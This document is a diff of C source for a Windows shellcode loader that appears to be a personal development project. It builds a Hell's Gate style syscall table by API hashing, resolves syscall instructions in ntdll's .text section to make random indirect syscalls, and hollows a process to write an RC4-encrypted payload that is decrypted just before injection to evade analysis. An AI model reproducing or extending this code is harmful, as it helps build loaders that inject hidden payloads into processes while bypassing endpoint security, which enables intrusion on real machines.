@@ -10,6 +10,7 @@ typedef struct _VX_TABLE_ENTRY {
     PVOID   pAddress;
     DWORD dwHash;
     WORD    wSystemCall;
+    WORD    wRCXVal;
 } VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;
 
 typedef struct _VX_TABLE {
@@ -21,7 +22,7 @@ typedef struct _VX_TABLE {
     
 //PVOID* pSystemCalls = NULL; //allocate PVOID * dwDLLSize memory for our array of pointers
 
-#define num_syscalls 2000
+#define num_syscalls 50
 PVOID* pSystemCalls[num_syscalls];
 VX_TABLE VxTable = { 0 };
 void initializeSystemCalls() {
@@ -127,6 +128,8 @@ unsigned char Rc4CipherText[] = {
 
 DWORD gSSN = 0;
 PVOID gJMP = NULL;
+WORD gCurrentSyscall = 0;
+
 
 unsigned char Rc4Key[] = {
         0xAD, 0x09, 0x40, 0xE9, 0x73, 0xF5, 0x00, 0x57, 0x5D, 0xD8, 0xAE, 0x89, 0x53, 0x8E, 0x05, 0x5D };
@@ -191,6 +194,7 @@ BOOL hollowProcess(PROCESS_INFORMATION Pi, SIZE_T sPayload) {
    
    // printf("RESULTSS????? %d, %d\n", result, bytesRW);
     getchar();
+    gCurrentSyscall = VxTable.Read.wRCXVal;
     NTSTATUS result = NoahRead3(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
     getchar();
     printf("Enging NoahRead\n");
@@ -205,7 +209,10 @@ BOOL hollowProcess(PROCESS_INFORMATION Pi, SIZE_T sPayload) {
     uintptr_t executableAddress = *((uintptr_t*)procAddr);//
     
     //result = syscalls.myNtReadVirtualMemory(Pi.hProcess, (LPCVOID)executableAddress, dataBuff, sizeof(dataBuff), &bytesRW);
-    result = Sw3NtReadVirtualMemory(Pi.hProcess, (LPCVOID)executableAddress, dataBuff, sizeof(dataBuff), & bytesRW);
+    //result = Sw3NtReadVirtualMemory(Pi.hProcess, (LPCVOID)executableAddress, dataBuff, sizeof(dataBuff), & bytesRW);
+    gCurrentSyscall = VxTable.Read.wRCXVal; // just for clairty
+    result = NoahRead3(Pi.hProcess, (LPCVOID)executableAddress, dataBuff, sizeof(dataBuff), &bytesRW);
+    printf("ntstatus RESULTSS????? 0x%x, %d\n", result, bytesRW);
 
     unsigned int e_lfanew = *((unsigned int*)(dataBuff + 0x3c));
     unsigned int rvaOffset = e_lfanew + 0x28;
@@ -223,7 +230,12 @@ BOOL hollowProcess(PROCESS_INFORMATION Pi, SIZE_T sPayload) {
     PVOID sizeTest = (PVOID)sPayload;
 
     //BOOL results = syscalls.myNtProtectVirtualMemory(Pi.hProcess, &entrypointAddr, &sizeTest, PAGE_EXECUTE_READWRITE, &oldPerm);
-    result = Sw3NtProtectVirtualMemory(Pi.hProcess, &entrypointAddr, &sizeTest, PAGE_EXECUTE_READWRITE, &oldPerm);
+    //result = Sw3NtProtectVirtualMemory(Pi.hProcess, &entrypointAddr, &sizeTest, PAGE_EXECUTE_READWRITE, &oldPerm);
+    gCurrentSyscall = VxTable.Protect.wRCXVal;
+    printf("gCurrentSyscall: %d\n", gCurrentSyscall);
+    printf("Protect Num: %d\n", VxTable.Protect.wRCXVal);
+    result = NoahRead3(Pi.hProcess, &entrypointAddr, &sizeTest, PAGE_EXECUTE_READWRITE, &oldPerm);
+    printf("ntstatus RESULTSS????? 0x%x, %d\n", result, oldPerm);
     
     
     //    BOOL results = VirtualProtectEx(Pi.hProcess, entrypointAddr, sPayload, PAGE_EXECUTE_READWRITE, &oldPerm);
@@ -252,8 +264,12 @@ BOOL hollowProcess(PROCESS_INFORMATION Pi, SIZE_T sPayload) {
     
     //BOOL bruh = syscalls.myNtWriteVirtualMemory(Pi.hProcess, test, pPayload, sPayload, &bytesRW);
     Rc4EncryptionViSystemFunc032(Rc4Key, Rc4CipherText, sizeof(Rc4Key), sizeof(Rc4CipherText)); //Allow as little time to analzye payload a spossible, decrypt just before write
-    BOOL bruh = Sw3NtWriteVirtualMemory(Pi.hProcess, test, Rc4CipherText, sizeof(Rc4CipherText), &bytesRW);
-   
+    
+    //BOOL bruh = Sw3NtWriteVirtualMemory(Pi.hProcess, test, Rc4CipherText, sizeof(Rc4CipherText), &bytesRW);
+    gCurrentSyscall = VxTable.Write.wRCXVal;
+    result = NoahRead3(Pi.hProcess, test, Rc4CipherText, sizeof(Rc4CipherText), &bytesRW);
+    printf("ntstatus RESULTSS????? 0x%x, %d\n", result, bytesRW);
+
     // St.pNtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten)
     //WriteProcessMemory(Pi.hProcess, test, pPayload, sPayload, &bytesRW);
 
@@ -268,6 +284,7 @@ BOOL hollowProcess(PROCESS_INFORMATION Pi, SIZE_T sPayload) {
     
     //ResumeThread(Pi.hThread);
     PULONG suspendCount;
+
     Sw3NtResumeThread(Pi.hThread, &suspendCount);
 }
 
@@ -442,7 +459,8 @@ void GetBase(IN PPEB pPEB, OUT PVOID* pBaseAddr) {
     *pBaseAddr = NULL; // No match found, set base address to NULL
 }
 
-
+uint64_t pTextSection = NULL;
+DWORD sTextSection = 0;
 void GetImageExportDir(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory, DWORD* dwDllSize) {
 
     PIMAGE_DOS_HEADER pImageDOSHeader = (PIMAGE_DOS_HEADER)pModuleBase; //Get a PIMAGE_DOS_HEADER struct from the modyle base 
@@ -451,12 +469,57 @@ void GetImageExportDir(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExport
 
     PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDOSHeader->e_lfanew); 
 
-
+    //This is to find the beginning of the .text sectoin of NTDLL so we can limit the scope of syscall opcodes to only wihtin their
+    PIMAGE_SECTION_HEADER pImageSectionHeaders = IMAGE_FIRST_SECTION(pImageNtHeaders); // a macro to essentially go from base address of NtHeaders then add offset to optional header, then adding size of optional header to get the first section.
+    WORD wNumberSection = pImageNtHeaders->FileHeader.NumberOfSections;
     //Now from the NT header we can extract the export address table for all fucntions within the dll
-
+    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
     *ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
     *dwDllSize = pImageNtHeaders->OptionalHeader.SizeOfHeaders + pImageNtHeaders->OptionalHeader.SizeOfImage;
     
+    for (int i = 0; i < wNumberSection; i++, pImageSectionHeaders++) {
+        
+        if (strcmp((char*)pImageSectionHeaders[i].Name, ".text") == 0) {
+            printf("Section: %s | 0x%p,\n", pImageSectionHeaders[i].Name, pImageSectionHeaders[i].VirtualAddress);
+            pTextSection = (uint64_t)((PBYTE)pModuleBase + pImageSectionHeaders[i].VirtualAddress);
+            sTextSection = pImageSectionHeaders[i].Misc.VirtualSize;
+            printf("Text Section NTDLL Pointer: 0x%p\nSize of .text Section: %d\n", pTextSection,sTextSection);
+
+        }
+    }
+
+    DWORD* addressOfFunctions = (DWORD*)((BYTE*)pModuleBase + pImageExportDirectory->AddressOfFunctions);
+    DWORD* addressOfNames = (DWORD*)((BYTE*)pModuleBase + pImageExportDirectory->AddressOfNames);
+    WORD* addressOfNameOrdinals = (WORD*)((BYTE*)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);
+
+    DWORD byteCounter = 0;
+    WORD counter = 0;
+
+    //this is defffff! the way to go. just loop through all the exported functions - find our sybscall - and move onto the next
+    // - particularly like because we avoind needing to filter out syscall opcodes outside of the systemcalls themselves within ntdll
+    for (int i = 0; i < pImageExportDirectory->NumberOfFunctions; i++) {
+        DWORD dwFunRVA = addressOfFunctions[addressOfNameOrdinals[i]];
+        PBYTE pbFuncAddress = (PBYTE)pModuleBase + dwFunRVA;
+        if (
+            (*(pbFuncAddress + byteCounter) == 0x0f) && (*(pbFuncAddress + byteCounter + 1) == 0x05)
+            ){
+
+            PBYTE opcode1 = *((PBYTE)pbFuncAddress + byteCounter);
+            PBYTE opcode2 = *((PBYTE)pbFuncAddress + byteCounter + 1);
+            printf("0x%p : %02X %02X\n",(pbFuncAddress + byteCounter),opcode1,opcode2);
+            pSystemCalls[counter] = (PVOID)((PBYTE)pbFuncAddress + byteCounter);
+            counter++;
+            byteCounter = 0;
+            }
+        byteCounter++;
+    }
+
+
+    return TRUE;
+
+    //While we're getting image export directory we can also populate the systemcalls list
+
+
 }
 
 // generate Djb2 hashes from wide-character input string
@@ -570,37 +633,45 @@ BOOL GetVXTableEntry(DWORD dwDLLSize,PVOID* pSystemCalls ,PVOID pModuleBase, PIM
     }
     //Now begin loop to populate list of syscall locaitons
 
-    WORD byteCounter = 0;
-    WORD counter = 0;
-    while (TRUE) {
-        if (byteCounter == dwDLLSize || counter == num_syscalls /*testing*/) {
-            return FALSE;
-            printf("End of DLL\n");
-        }
-        if (
-            *((PBYTE)pModuleBase + byteCounter) == 0x0f && *((PBYTE)pModuleBase + byteCounter + 1) == 0x05
-            ) {
-            PBYTE opcode1 = *((PBYTE)pModuleBase + byteCounter);
-            PBYTE opcode2 = *((PBYTE)pModuleBase + byteCounter + 1);
-            printf("\n");
-           pSystemCalls[counter] = (PVOID)((PBYTE)pModuleBase + byteCounter);
-           PVX_TABLE *pVxTable = &VxTable;
-           printf("Syscalls Array: %p\nVxTable: %p\n", pSystemCalls, pVxTable);
-            printf("0x%p\t%02x\t%02x\n", pSystemCalls[counter],opcode1, opcode2); // NICE
-            
-            counter++;
-        }
-        byteCounter = byteCounter + 1;
-
-        }
-
-
         //Now since we don't want to pass strings of APIs we will hash and compare hashes to pre-hashed list.
         //See the API_Hashing module example
     return TRUE;
 }
 
+BOOL GetSystemcallAddresses(DWORD dwDLLSize, PVOID* pSystemCalls, PVOID pModuleBase, PVOID pTextSection) {
 
+    DWORD byteCounter = 0;
+    WORD counter = 0;
+    while (TRUE) {
+        if (byteCounter == dwDLLSize || counter == num_syscalls /*testing*/ || byteCounter >= sTextSection) {
+            printf("byteCounter: %d\n", byteCounter);
+            printf("sTextSection: %d\n", sTextSection);
+            printf("dwDLLSize: %d\n", dwDLLSize);
+            printf("Counter; %d\n", counter);
+
+            printf("End of something lol !!!!!!!!!\n");
+            getchar();
+            return FALSE;
+        }
+        if (
+            *((PBYTE)pTextSection + byteCounter) == 0x0f && *((PBYTE)pTextSection + byteCounter + 1) == 0x05
+            ) {
+
+            PBYTE opcode1 = *((PBYTE)pTextSection + byteCounter);
+            PBYTE opcode2 = *((PBYTE)pTextSection + byteCounter + 1);
+            printf("\n");
+            pSystemCalls[counter] = (PVOID)((PBYTE)pTextSection + byteCounter);
+            PVX_TABLE* pVxTable = &VxTable;
+            printf("Syscalls Array: %p\nVxTable: %p\n", pSystemCalls, pVxTable);
+            printf("0x%p\t%02x\t%02x\n", pSystemCalls[counter], opcode1, opcode2); // NICE
+
+            counter++;
+        }
+        byteCounter = byteCounter + 1;
+
+    }
+    return TRUE;
+}
 
 //EXTERN IndirectSyscall : PROC
 //find the location of a random ahh syscall to jump to.
@@ -652,9 +723,10 @@ EXTERN_C PVOID* GetJMP() {
 
 
 EXTERN_C void UpdateGlobals(DWORD input) {
-    //uint64_t address = pSystemCalls[rand() % (sizeof(pSystemCalls) / sizeof(pSystemCalls[0]))];    //PVOID address = (PVOID)(0xdeadbeef);
+    printf("Indexes of systemcalls %d\n", sizeof(pSystemCalls) / sizeof(pSystemCalls[0]));
+   uint64_t address = pSystemCalls[rand() % (sizeof(pSystemCalls) / sizeof(pSystemCalls[0]))];    //PVOID address = (PVOID)(0xdeadbeef);
     //PVOID address = (PVOID)(0xdeadbeef);
-    uint64_t* address = (uint64_t*)0x00007FF97312D232;
+    //uint64_t* address = (uint64_t*)0x00007FF97312D232;
 
     printf("Getting JMP! 0x%p\n", address);
     gJMP = address;
@@ -664,24 +736,34 @@ EXTERN_C void UpdateGlobals(DWORD input) {
     printf("Input val to UpdateGloabls: %d\n", input);
     getchar();
 
-    if (input == 0) {
+    if (input == 0) { //Read
         printf("Wow! Read Syscall Getter called: %d\n", VxTable.Read.wSystemCall);
         printf("gSSN: 0x%p", &gSSN);
         gSSN = VxTable.Read.wSystemCall;
         getchar();
         return (DWORD)VxTable.Read.wSystemCall;
     }
-    else if (input == 1) {
-        return VxTable.Write.wSystemCall;
+    else if (input == 1) { //Write
+        printf("Wow! WRite Syscall Getter called: %d\n", VxTable.Write.wSystemCall);
+        printf("gSSN: 0x%p", &gSSN);
+        gSSN = VxTable.Write.wSystemCall;
+        getchar();
+        return (DWORD)VxTable.Write.wSystemCall;
     }
-    else if (input == 2) {
+    else if (input == 2) { //Allocate
         return VxTable.Allocate.wSystemCall;
+    }
+    else if (input == 3) { //Protect
+        printf("Wow! Protect Syscall Getter called: %d\n", VxTable.Protect.wSystemCall);
+        printf("gSSN: 0x%p", &gSSN);
+        gSSN = VxTable.Protect.wSystemCall;
+        getchar();
+        return VxTable.Protect.wSystemCall;
     }
     return (DWORD)VxTable.Read.wSystemCall;
 
 
 }
-
 
 int main() {
 
@@ -716,8 +798,6 @@ int main() {
     PTEB pCurrentTeb = (void*)__readgsqword(0x30); //Find the address of Thread Environment Block.
                                                     //Read from GS register at 0x30 offset for TEB
                                                     //Using TEB we can find PEB
-
-    
     PPEB pCurrentPEB = pCurrentTeb->ProcessEnvironmentBlock;
     PVOID pNtdllBase = NULL;
     printf("Getting base...\n");
@@ -768,11 +848,17 @@ int main() {
     printf("Systemcall: Write\t ADDR: 0x%p \t Hash: %0.8X \t SSN: %d\n", VxTable.Write.pAddress, VxTable.Write.dwHash, VxTable.Write.wSystemCall);
 
     // i wish there was a way to pass the entire struct and then loop through this
-    GetVXTableEntry(dwDLLSize,&pSystemCalls,pNtdllBase, ppImageExportDirectory, &VxTable.Write);
+
     GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.Read);
+    VxTable.Read.wRCXVal = 0;
+    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.Write);
+    VxTable.Write.wRCXVal = 1;
     GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.Allocate);
+    VxTable.Allocate.wRCXVal = 2;
     GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.Protect);
-    
+    VxTable.Protect.wRCXVal = 3;
+
+    //GetSystemcallAddresses(dwDLLSize, &pSystemCalls, pNtdllBase, pTextSection);
 
     printf("Second run: Systemcall: Write\t ADDR: 0x%p \t Hash: %0.8X \t SSN: %hu\n", VxTable.Write.pAddress, VxTable.Write.dwHash, VxTable.Write.wSystemCall);
     //Now we just have to call the function using assembly temmplates!
